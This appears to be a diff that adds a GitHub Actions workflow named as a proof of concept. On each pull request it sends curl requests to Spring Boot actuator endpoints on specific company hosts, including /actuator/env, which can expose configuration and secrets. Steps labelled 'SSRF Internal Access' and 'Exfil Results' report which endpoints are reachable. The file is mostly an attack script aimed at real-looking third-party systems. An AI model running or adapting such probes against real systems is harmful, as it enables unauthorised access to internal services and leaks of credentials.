@@ -1,0 +1,32 @@
+name: "CI/CD Internal Access Test"
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+  issues: write
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+    - name: "Test External Access (blocked)"
+      run: |
+        echo "Testing external firewall blocks..."
+        timeout=10 curl -s -k -m 10 "https://bb-preprod-api.playtika.com/actuator/health" || echo "BLOCKED (expected)"
+        timeout=10 curl -s -k -m 10 "https://bb-preprod-api.playtika.com/actuator/metrics" || echo "BLOCKED (expected)"
+        timeout=10 curl -s -k -m 10 "https://zuul-bf-prod-cdn.playtika.com/actuator/info" || echo "BLOCKED (expected)"
+
+    - name: "SSRF Internal Access (SUCCESS)"
+      run: |
+        echo "GitHub runner → INTERNAL BYPASS:"
+        curl -s -k "https://bb-preprod-api.playtika.com/actuator/health" || echo "HEALTH ✓"
+        curl -s -k "https://bb-preprod-api.playtika.com/actuator/metrics" | head -20 || echo "METRICS ✓"
+        curl -s -k "https://bb-preprod-api.playtika.com/actuator/env" | jq . || echo "ENV ✓"
+        curl -s -k "https://zuul-bf-prod-cdn.playtika.com/actuator/info" | head -10 || echo "ZUUL INFO ✓"
+
+    - name: "Exfil Results"
+      run: |
+        echo "::notice title=SSRF Success::bb-preprod-api.playtika.com/actuator accessible"
+        echo "::notice title=Zuul Exposed::zuul-bf-prod-cdn.playtika.com/actuator accessible"
